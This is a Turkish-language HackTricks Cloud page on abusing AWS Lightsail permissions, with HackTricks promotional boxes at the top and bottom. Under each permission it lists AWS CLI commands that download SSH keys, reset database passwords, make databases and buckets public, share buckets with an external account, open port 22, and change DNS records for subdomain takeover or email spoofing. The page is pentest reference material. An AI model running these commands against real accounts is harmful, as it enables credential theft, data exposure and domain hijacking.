# AWS - Lightsail Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## Lightsail

Lightsail hakkında daha fazla bilgi için:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Önemli bir not olarak, Lightsail **kullanıcıya ait IAM rollerini değil**, AWS tarafından yönetilen bir hesaba ait IAM rollerini kullanır, bu yüzden bu hizmeti kullanarak ayrıcalık yükseltme yapamazsınız. Bununla birlikte, bu hizmette **kod, API anahtarları ve veritabanı bilgileri gibi hassas veriler** bulunabilir.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Bu izin, örneklerin erişimi için SSH anahtarlarını almanıza olanak sağlar:
```
aws lightsail download-default-key-pair
```
**Potansiyel Etki:** Örnekler içinde hassas bilgiler bulunabilir.

### `lightsail:GetInstanceAccessDetails`

Bu izin, örneklerin erişimi için SSH anahtarları oluşturmanıza izin verecektir:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Potansiyel Etki:** Örneklerin içinde hassas bilgiler bulunabilir.

### `lightsail:CreateBucketAccessKey`

Bu izin, bir anahtar almanıza izin verecektir. Bu anahtarla kovete erişebilirsiniz:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Potansiyel Etki:** Kova içinde hassas bilgiler bulunabilir.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Bu izin, veritabanına erişmek için kimlik bilgilerini almanıza olanak sağlar:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Potansiyel Etki:** Veritabanı içinde hassas bilgiler bulunabilir.

### `lightsail:UpdateRelationalDatabase`

Bu izin, veritabanına erişmek için şifreyi değiştirmenize olanak sağlar:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Veritabanı halka açık değilse, bu izinlerle halka açık hale de getirebilirsiniz:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Potansiyel Etki:** Veritabanı içinde hassas bilgiler bulunabilir.

### `lightsail:OpenInstancePublicPorts`

Bu izin, portların İnternet'e açılmasına izin verir.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Potansiyel Etki:** Hassas bağlantı noktalarına erişim.

### `lightsail:PutInstancePublicPorts`

Bu izin, bağlantı noktalarını İnternet'e açmanıza olanak sağlar. Not edin ki, bu çağrıda belirtilmeyen herhangi bir açık bağlantı noktası kapatılacaktır.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Potansiyel Etki:** Hassas bağlantı noktalarına erişim sağlar.

### `lightsail:SetResourceAccessForBucket`

Bu izin, ek kimlik bilgisi olmadan bir örneğe bir kova erişimi sağlamaya izin verir.

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Potansiyel Etki:** Hassas bilgilere sahip kovalara potansiyel yeni erişim.

### `lightsail:UpdateBucket`

Bu izinle bir saldırgan, kendi AWS hesabına kovalara okuma erişimi sağlayabilir veya kovaları herkese açık hale getirebilir:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Potansiyel Etki:** Hassas bilgilere sahip kovalara potansiyel yeni erişim.

### `lightsail:UpdateContainerService`

Bu izinlerle bir saldırgan, konteyner hizmetinden özel ECR'lere erişim sağlayabilir.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Potansiyel Etki:** Özel ECR'den hassas bilgiler alınabilir.

### `lightsail:CreateDomainEntry`

Bu izne sahip bir saldırgan, alt alan adı oluşturabilir ve bunu kendi IP adresine yönlendirebilir (alt alan adı ele geçirme), veya kendisine ait bir SPF kaydı oluşturabilir ve böylece alan adından sahte e-postalar gönderebilir veya hatta ana alan adı kendi IP adresine yönlendirebilir.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potansiyel Etki:** Bir alan adını ele geçirme

### `lightsail:UpdateDomainEntry`

Bu izne sahip bir saldırgan, alt alan adı oluşturabilir ve onu kendi IP adresine yönlendirebilir (alt alan adı ele geçirme), veya kendisine ait bir SPF kaydı oluşturabilir ve alan adından sahte e-postalar göndermesine izin verebilir, hatta ana alan adı için kendi IP adresini ayarlayabilir.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potansiyel Etki:** Bir alan adını ele geçirme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
